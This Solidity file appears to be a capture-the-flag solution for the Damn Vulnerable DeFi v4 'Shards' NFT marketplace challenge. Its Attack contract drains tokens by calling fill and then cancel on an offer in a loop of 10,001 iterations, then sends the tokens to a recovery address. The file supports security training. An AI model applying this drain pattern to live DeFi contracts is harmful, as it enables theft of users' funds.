// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {
    ShardsNFTMarketplace,
    IShardsNFTMarketplace,
    ShardsFeeVault,
    DamnValuableToken,
    DamnValuableNFT
} from "../../src/shards/ShardsNFTMarketplace.sol";
import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";


contract Attack {
    ShardsNFTMarketplace public nftMarketplace;
    DamnValuableToken public token;
    address recovery;

    constructor (
        ShardsNFTMarketplace _nftMarketplace,
        DamnValuableToken _token,
        address _recovery
    ) {
        nftMarketplace = _nftMarketplace;
        token = _token;
        recovery = _recovery;
    }

    function attack (uint64 _offerId) external {
        uint256 wantShards = 100;

        for (uint256 i = 0; i < 10001; i++) {
            nftMarketplace.fill(_offerId, wantShards);
            nftMarketplace.cancel(1, i);
        }

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}